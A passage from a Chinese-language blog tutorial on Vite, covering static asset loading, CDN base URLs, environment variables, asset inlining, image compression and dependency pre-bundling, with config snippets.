class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vite.config.ts</span></span><br><span class="line"><span class="keyword">import</span> path <span class="keyword">from</span> <span class="string">&#x27;path&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">resolve</span>: &#123;</span><br><span class="line">    <span class="comment">// 别名配置</span></span><br><span class="line">    <span class="attr">alias</span>: &#123;</span><br><span class="line">      <span class="string">&#x27;@assets&#x27;</span>: path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;src/assets&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样 Vite 在遇到 @assets 路径的时候，会自动帮我们定位至根目录下的 src&#x2F;assets 目录。这样使用以上三种方式引入图片该别名路径都能生效</p><blockquote><p>值得注意的是，alias 别名配置不仅在 JavaScript 的 import 语句中生效，在 CSS 代码的 @import 和 url 导入语句中也同样生效。</p></blockquote><p><a name="DKFmV"></a></p><h4 id="SVG-组件方式加载"><a href="#SVG-组件方式加载" class="headerlink" title="SVG 组件方式加载"></a>SVG 组件方式加载</h4><p>我们通常希望能将 svg 当做一个组件来引入，这样我们可以很方便地修改 svg 的各种属性，而且比 img 标签的引入方式更加优雅。<br />SVG 组件加载在不同的前端框架中的实现不太相同，社区中也已经了有了对应的插件支持：</p><ul><li>Vue2 项目中可以使用 <a href="https://link.juejin.cn/?target=https://github.com/pakholeung37/vite-plugin-vue2-svg">vite-plugin-vue2-svg</a> 插件</li><li>Vue3 项目中可以引入 <a href="https://link.juejin.cn/?target=https://github.com/jpkleemans/vite-svg-loader">vite-svg-loader</a></li><li>React 项目使用 <a href="https://link.juejin.cn/?target=https://github.com/pd4d10/vite-plugin-svgr">vite-plugin-svgr</a> 插件</li></ul><p><a name="MOVoV"></a></p><h3 id="JSON-加载"><a href="#JSON-加载" class="headerlink" title="JSON 加载"></a>JSON 加载</h3><p>Vite 中已经内置了对于 JSON 文件的解析，底层使用 @rollup&#x2F;pluginutils 的 dataToEsm 方法将 JSON 对象转换为一个包含各种具名导出的 ES 模块<br />在项目中的使用方式如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; version &#125; <span class="keyword">from</span> <span class="string">&#x27;../../../package.json&#x27;</span>;</span><br></pre></td></tr></table></figure><p>你也可以在配置文件禁用按名导入的方式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vite.config.ts</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">json</span>: &#123;</span><br><span class="line">    <span class="attr">stringify</span>: <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样会将 JSON 的内容解析为 <code>export default JSON.parse(&quot;xxx&quot;)</code>，这样会失去按名导出的能力，不过在 JSON 数据量比较大的时候，可以优化解析性能。</p><p><a name="a1b8T"></a></p><h3 id="Web-Worker-脚本"><a href="#Web-Worker-脚本" class="headerlink" title="Web Worker 脚本"></a>Web Worker 脚本</h3><p>Vite 中使用 Web Worker 非常简单<br />我们可以新建 Header&#x2F;example.js 文件：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">start</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 给主线程传值</span></span><br><span class="line">    <span class="title function_">postMessage</span>(++count);</span><br><span class="line">  &#125;, <span class="number">2000</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">start</span>();</span><br></pre></td></tr></table></figure><p>然后在 Header 组件中引入，引入的时候注意加上 ?worker 后缀，告诉 Vite 这是一个 Web Worker 脚本文件：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Worker</span> <span class="keyword">from</span> <span class="string">&#x27;./example.js?worker&#x27;</span>;</span><br><span class="line"><span class="comment">// 1. 初始化 Worker 实例</span></span><br><span class="line"><span class="keyword">const</span> worker = <span class="keyword">new</span> <span class="title class_">Worker</span>();</span><br><span class="line"><span class="comment">// 2. 主线程监听 worker 的信息</span></span><br><span class="line">worker.<span class="title function_">addEventListener</span>(<span class="string">&#x27;message&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>打开浏览器的控制面板，你可以看到 Worker 传给主线程的信息已经成功打印：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695022397627-4bd3348e-c7c0-48ef-b789-314f7e8dbd5b.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695022397627-4bd3348e-c7c0-48ef-b789-314f7e8dbd5b.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="Tj0bK"></a></p><h3 id="Web-Assembly-文件"><a href="#Web-Assembly-文件" class="headerlink" title="Web Assembly 文件"></a>Web Assembly 文件</h3><p>Vite 对于 .wasm 文件也提供了开箱即用的支持</p><p><a name="qyvtw"></a></p><h3 id="其它静态资源"><a href="#其它静态资源" class="headerlink" title="其它静态资源"></a>其它静态资源</h3><p>除了上述的一些资源格式，Vite 也对下面几类格式提供了内置的支持：</p><ul><li>媒体类文件，包括 mp4、webm、ogg、mp3、wav、flac 和 aac</li><li>字体类文件。包括 woff、woff2、eot、ttf 和 otf</li><li>文本类。包括 webmanifest、pdf 和 txt</li></ul><p>也就是说，你可以在 Vite 将这些类型的文件当做一个 ES 模块来导入使用。<br />如果你的项目中还存在其它格式的静态资源，你可以通过 <strong>assetsInclude 配置</strong>让 Vite 来支持加载：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vite.config.ts</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">assetsInclude</span>: [<span class="string">&#x27;.gltf&#x27;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="UZObj"></a></p><h3 id="特殊资源后缀"><a href="#特殊资源后缀" class="headerlink" title="特殊资源后缀"></a>特殊资源后缀</h3><p>Vite 中引入静态资源时，也支持在路径最后加上一些特殊的 query 后缀，例如：</p><ul><li>?url：表示获取资源的路径，这在只想获取文件路径而不是内容的场景将会很有用。</li><li>?raw：表示获取资源的字符串内容，如果你只想拿到资源的原始内容，可以使用这个后缀。</li><li>?inline:：表示资源强制内联，而不是打包成单独的文件。</li></ul><p><a name="Ck8vY"></a></p><h2 id="静态资源的生产环境处理"><a href="#静态资源的生产环境处理" class="headerlink" title="静态资源的生产环境处理"></a>静态资源的生产环境处理</h2><p>在前面的内容中，我们围绕着如何加载静态资源这个问题，在 Vite 中进行具体的编码及配置。<br />但另一方面，在生产环境下，我们又面临着一些新的问题：</p><ul><li>部署域名怎么配置？</li><li>资源打包成单文件还是作为 Base64 格式内联?</li><li>图片太大了怎么压缩？</li><li>svg 请求数量太多了怎么优化？<br><a name="hN2O5"></a></li></ul><h3 id="自定义部署域名"><a href="#自定义部署域名" class="headerlink" title="自定义部署域名"></a>自定义部署域名</h3><p>一般在我们访问线上的站点时，站点里面一些静态资源的地址都包含了相应域名的前缀，如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://sanyuan.cos.ap-beijing.myqcloud.com/logo.png&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>以上面这个地址例子，<a href="https://sanyuan.cos.ap-beijing.myqcloud.com/">https://sanyuan.cos.ap-beijing.myqcloud.com</a> 是 CDN 地址前缀，&#x2F;logo.png 则是我们开发阶段使用的路径。<br />那么，我们是不是需要在上线前把图片先上传到 CDN，然后将代码中的地址<strong>手动</strong>替换成线上地址呢？那这样就太麻烦了。</p><p>在 Vite 中我们可以有更加自动化的方式来实现地址的替换，只需要在配置文件中指定 base 参数即可：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vite.config.ts</span></span><br><span class="line"><span class="comment">// 是否为生产环境，在生产环境一般会注入 NODE_ENV 这个环境变量，见下面的环境变量文件配置</span></span><br><span class="line"><span class="keyword">const</span> isProduction = process.<span class="property">env</span>.<span class="property">NODE_ENV</span> === <span class="string">&#x27;production&#x27;</span>;</span><br><span class="line"><span class="comment">// 填入项目的 CDN 域名地址</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CDN_URL</span> = <span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 具体配置</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">base</span>: isProduction ? <span class="attr">CDN_URL</span>: <span class="string">&#x27;/&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// .env.development</span></span><br><span class="line"><span class="variable constant_">NODE_ENV</span>=development</span><br><span class="line"></span><br><span class="line"><span class="comment">// .env.production</span></span><br><span class="line"><span class="variable constant_">NODE_ENV</span>=production</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意在项目根目录新增的两个环境变量文件 <code>.env.development</code> 和 <code>.env.production</code>，顾名思义，即分别在开发环境和生产环境注入一些环境变量，这里为了区分不同环境我们加上了 NODE_ENV，你也可以根据需要添加别的环境变量。</p><blockquote><p>打包的时候 Vite 会自动将这些环境变量替换为相应的字符串</p></blockquote><p>接着执行 pnpm run build，可以发现产物中的静态资源地址已经自动加上了 CDN 地址前缀了<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695023066167-d632f2b6-4175-4496-88d1-7558fdfd5027.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695023066167-d632f2b6-4175-4496-88d1-7558fdfd5027.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>有时候可能项目中的某些图片需要存放到另外的存储服务，我们同样可以通过定义环境变量的方式来解决这个问题，在项目根目录新增 .env 文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 开发环境优先级: .env.development &gt; .env</span><br><span class="line">// 生产环境优先级: .env.production &gt; .env</span><br><span class="line"></span><br><span class="line">// .env 文件</span><br><span class="line">VITE_IMG_BASE_URL=https://my-image-cdn.com</span><br></pre></td></tr></table></figure><p>然后进入 src&#x2F;vite-env.d.ts 增加类型声明：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;reference types=&quot;vite/client&quot; /&gt;</span></span><br><span class="line"></span><br><span class="line">interface <span class="title class_">ImportMetaEnv</span> &#123;</span><br><span class="line">  readonly <span class="attr">VITE_APP_TITLE</span>: string;</span><br><span class="line">  <span class="comment">// 自定义的环境变量</span></span><br><span class="line">  readonly <span class="attr">VITE_IMG_BASE_URL</span>: string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">ImportMeta</span> &#123;</span><br><span class="line">  readonly <span class="attr">env</span>: <span class="title class_">ImportMetaEnv</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>值得注意的是，如果某个环境变量要在 Vite 中通过 import.meta.env 访问，那么它必须以 VITE_ 开头，如 VITE_IMG_BASE_URL</p></blockquote><p>接下来我们在组件中来使用这个环境变量：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">:src</span>=<span class="string">&quot;new URL(&#x27;./logo.png&#x27;, import.meta.env.VITE_IMG_BASE_URL).href&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>接下来在开发环境启动项目或者生产环境打包后可以看到环境变量已经被替换，地址能够正常显示：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695023263042-307d720b-5c4d-4d21-937c-d6e10efbb1f4.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695023263042-307d720b-5c4d-4d21-937c-d6e10efbb1f4.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />至此，我们就彻底解决了图片资源生产环境域名替换的问题。</p><p><a name="qwjUC"></a></p><h3 id="单文件-or-内联"><a href="#单文件-or-内联" class="headerlink" title="单文件 or 内联"></a>单文件 or 内联</h3><p>在 Vite 中，所有的静态资源都有两种构建方式：</p><ol><li>一种是打包成一个单文件</li><li>另一种是通过 base64 编码的格式内嵌到代码中</li></ol><p>这两种方案到底应该如何来选择呢？</p><p>对于比较小的资源，适合内联到代码中，一方面对代码体积的影响很小，另一方面可以减少不必要的网络请求，优化网络性能。<br />而对于比较大的资源，就推荐单独打包成一个文件，而不是内联了，否则可能导致上 MB 的 base64 字符串内嵌到代码中，导致代码体积瞬间庞大，页面加载性能直线下降。</p><p>Vite 中内置的优化方案是这样的：</p><ol><li>如果静态资源体积 &gt;&#x3D; 4KB，则提取成单独的文件</li><li>如果静态资源体积 &lt; 4KB，则作为 base64 格式的字符串内联</li></ol><p>当然，这个临界值你可以通过 <code>build.assetsInlineLimit</code> 自行配置，如下代码所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vite.config.ts</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">build</span>: &#123;</span><br><span class="line">    <span class="comment">// 8 KB</span></span><br><span class="line">    <span class="attr">assetsInlineLimit</span>: <span class="number">8</span> * <span class="number">1024</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>svg 格式的文件不受这个临时值的影响，始终会打包成单独的文件，因为它和普通格式的图片不一样，需要动态设置一些属性</p></blockquote><p><a name="XZw4F"></a></p><h3 id="图片压缩"><a href="#图片压缩" class="headerlink" title="图片压缩"></a>图片压缩</h3><p>图片资源的体积往往是项目产物体积的大头，如果能尽可能精简图片的体积，那么对项目整体打包产物体积的优化将会是非常明显的。<br />在 JavaScript 领域有一个非常知名的图片压缩库 <a href="https://link.juejin.cn/?target=https://www.npmjs.com/package/imagemin">imagemin</a>，作为一个底层的压缩工具，前端的项目中经常基于它来进行图片压缩，比如 Webpack 中大名鼎鼎的 image-webpack-loader。</p><p>在 Vite 社区当中也已经有了开箱即用的 Vite 插件：vite-plugin-imagemin<br />可以在 Vite 配置文件中引入：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vite.config.ts</span></span><br><span class="line"><span class="keyword">import</span> viteImagemin <span class="keyword">from</span> <span class="string">&#x27;vite-plugin-imagemin&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">    <span class="comment">// 忽略前面的插件</span></span><br><span class="line">    <span class="title function_">viteImagemin</span>(&#123;</span><br><span class="line">      <span class="comment">// 无损压缩配置，无损压缩下图片质量不会变差</span></span><br><span class="line">      <span class="attr">optipng</span>: &#123;</span><br><span class="line">        <span class="attr">optimizationLevel</span>: <span class="number">7</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="comment">// 有损压缩配置，有损压缩下图片质量可能会变差</span></span><br><span class="line">      <span class="attr">pngquant</span>: &#123;</span><br><span class="line">        <span class="attr">quality</span>: [<span class="number">0.8</span>, <span class="number">0.9</span>],</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="comment">// svg 优化</span></span><br><span class="line">      <span class="attr">svgo</span>: &#123;</span><br><span class="line">        <span class="attr">plugins</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&#x27;removeViewBox&#x27;</span></span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&#x27;removeEmptyAttrs&#x27;</span>,</span><br><span class="line">            <span class="attr">active</span>: <span class="literal">false</span></span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来我们可以尝试执行 pnpm run build 进行打包：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695023535422-2b4d8874-7fcf-409a-bbd1-28e11f7497d1.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695023535422-2b4d8874-7fcf-409a-bbd1-28e11f7497d1.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />Vite 插件已经自动帮助我们调用 imagemin 进行项目图片的压缩，可以看到<strong>压缩的效果非常明显</strong>，强烈推荐大家在项目中使用。</p><p><a name="IP3Uu"></a></p><h3 id="雪碧图优化"><a href="#雪碧图优化" class="headerlink" title="雪碧图优化"></a>雪碧图优化</h3><p>将所有的 svg 内容都内联到 HTML 中，省去了大量 svg 的网络请求。</p><p><a name="qIxNk"></a></p><h2 id="依赖预构建"><a href="#依赖预构建" class="headerlink" title="依赖预构建"></a>依赖预构建</h2><p>Vite 是一个提倡 no-bundle 的构建工具，相比于传统的 Webpack，能做到开发时的模块按需编译，而不用先打包完再加载。但模块代码其实分为两部分：</p><ol><li>一部分是源代码，也就是业务代码</li><li>另一部分是第三方依赖的代码，即 node_modules 中的代码</li></ol><p>所谓的 no-bundle <strong>只是对于源代码而言</strong>，对于第三方依赖而言，Vite 还是选择 bundle（打包），并且使用速度极快的打包器 Esbuild 来完成这一过程，达到秒级的依赖编译速度。<br />接下来我们将要熟悉 Vite 的<strong>预构建功能</strong>，深入体会各个配置的应用场景和使用姿势，学会在实战中驾驭预构建的能力。</p><p><a name="QBpfo"></a></p><h3 id="为什么需要预构建？"><a href="#为什么需要预构建？" class="headerlink" title="为什么需要预构建？"></a>为什么需要预构建？</h3><p>为什么在开发阶段我们要对第三方依赖进行预构建？如果不进行预构建会怎么样？</p><p>首先 Vite 是基于浏览器原生 ES 模块规范实现的 Dev Server，不论是应用代码，还是第三方依赖的代码，理应符合 ESM 规范才能够正常运行。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/34869350/1695203692834-c2281253-2438-4999-baf8-fe8088251271.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/34869350/1695203692834-c2281253-2438-4999-baf8-fe8088251271.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="截屏2023-09-20 17.54.45.png"><br />但可惜，我们没有办法控制第三方的打包规范。<br />就目前来看，还有相当多的第三方库仍然没有 ES 版本的产物，比如大名鼎鼎的 react：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// react 入口文件</span></span><br><span class="line"><span class="comment">// 只有 CommonJS 格式</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (process.<span class="property">env</span>.<span class="property">NODE_ENV</span> === <span class="string">&quot;production&quot;</span>) &#123;</span><br><span class="line">  <span class="variable language_">module</span>.<span class="property">exports</span> = <span class="built_in">require</span>(<span class="string">&quot;./cjs/react.production.min.js&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable language_">module</span>.<span class="property">exports</span> = <span class="built_in">require</span>(<span class="string">&quot;./cjs/react.development.js&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种 CommonJS 格式的代码在 Vite 当中无法直接运行，我们需要将它转换成 ESM 格式的产物。</p><p>此外，还有一个比较重要的问题——<strong>请求瀑布流问题</strong>。<br />比如说，知名的 loadsh-es 库本身是有 ES 版本产物的，可以在 Vite 中直接运行。但实际上，它在加载时会发出特别多的请求，导致页面加载的前几秒几都乎处于卡顿状态，拿一个简单的 demo 项目举例，请求情况如下图所示:<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695024832556-711ff524-fa3f-4a7c-9d6c-9e5c852906bf.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695024832556-711ff524-fa3f-4a7c-9d6c-9e5c852906bf.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />每个 import 都会触发一次新的文件请求，因此在这种依赖层级深、涉及模块数量多的情况下，会触发成百上千个网络请求。<br />巨大的请求量加上 Chrome 对同一个域名下只能同时支持 6 个 HTTP 并发请求的限制，导致页面加载十分缓慢，与 Vite 主导性能优势的初衷背道而驰。</p><p>解决方案就是依赖预构建，在进行<strong>依赖的预构建</strong>之后，lodash-es 这个库的代码被打包成了一个文件，这样请求的数量会骤然减少，页面加载也快了许多。<br />下图是进行预构建之后的请求情况，你可以对照看看：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695024943872-eca8cf8e-b4f9-4917-90e3-5dedb04b78e6.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695024943872-eca8cf8e-b4f9-4917-90e3-5dedb04b78e6.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>总之，依赖预构建主要做了两件事情：</p><ol><li><strong>将其他格式（如 UMD 和 CommonJS）的产物转换为 ESM 格式</strong>，使其在浏览器通过 <script type="module"><script>的方式正常加载。</li><li><strong>打包第三方库的代码，将各个第三方库分散的文件合并到一起，减少 HTTP 请求数量</strong>。从而避免页面加载性能劣化。</li></ol><p>而这两件事情全部由性能优异的 Esbuild（基于 Golang 开发）完成，而不是传统的 Webpack/Rollup，所以也不会有明显的打包性能问题，反而是 Vite 项目启动飞快（秒级启动）的一个<strong>核心原因</strong>。</p><blockquote><p>ps: Vite 1.x 使用了 Rollup 来进行依赖预构建，在 2.x 版本将 Rollup 换成了 Esbuild，编译速度提升了<a href="https://link.juejin.cn/?target=https://esbuild.github.io/">近 100 倍</a></p></blockquote><p><a name="Y41vg"></a></p><h3 id="如何开启预构建？"><a href="#如何开启预构建？" class="headerlink" title="如何开启预构建？"></a>如何开启预构建？</h3><p>在 Vite 中有两种开启预构建的方式，分别是<strong>自动开启</strong>和<strong>手动开启</strong>。<br><a name="o0EPF"></a></p><h4 id="自动开启"><a href="#自动开启" class="headerlink" title="自动开启"></a>自动开启</h4><p>当我们在第一次启动项目的时候，可以在命令行窗口看见如下的信息：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695025151240-3864732f-82f7-47c1-bc63-8bdb4d4696e0.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695025151240-3864732f-82f7-47c1-bc63-8bdb4d4696e0.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />在浏览器访问页面后，打开 Dev Tools 中的网络调试面板，你可以发现第三方包的引入路径已经被重写：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"><span class="comment">// 路径被重写，定向到预构建产物文件中</span></span><br><span class="line"><span class="keyword">import</span> __vite__cjsImport0_react <span class="keyword">from</span> <span class="string">&quot;/node_modules/.vite/react.js?v=979739df&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">React</span> = __vite__cjsImport0_react.<span class="property">__esModule</span></span><br><span class="line">  ? __vite__cjsImport0_react.<span class="property">default</span></span><br><span class="line">  : __vite__cjsImport0_react;</span><br></pre></td></tr></table></figure><p><a name="O9Rk5"></a></p><h4 id="手动开启"><a href="#手动开启" class="headerlink" title="手动开启"></a>手动开启</h4><p>上面提到了预构建中本地文件系统的产物缓存机制，而少数场景下我们不希望用本地的缓存文件，比如需要调试某个包的预构建结果，我推荐使用下面任意一种方法清除缓存：</p><ol><li>删除 node_modules/.vite 目录</li><li>在 Vite 配置文件中，将 server.force 设为 true（注意，Vite 3.0 中配置项有所更新，你需要将 optimizeDeps.force 设为 true）</li><li>命令行执行 npx vite --force 或者 npx vite optimize<blockquote><p>Vite 项目的启动可以分为两步</p><ol><li>第一步是依赖预构建</li><li>第二步才是 Dev Server 的启动</li></ol><p>npx vite optimize 相比于其它的方案，仅仅完成第一步的功能</p></blockquote></li></ol><p><a name="USigl"></a></p><h3 id="自定义配置详解"><a href="#自定义配置详解" class="headerlink" title="自定义配置详解"></a>自定义配置详解</h3><p>前面说到了如何启动预构建的问题，现在我们来了解怎样通过 Vite 提供的配置项来<strong>定制预构建的过程</strong>。<br 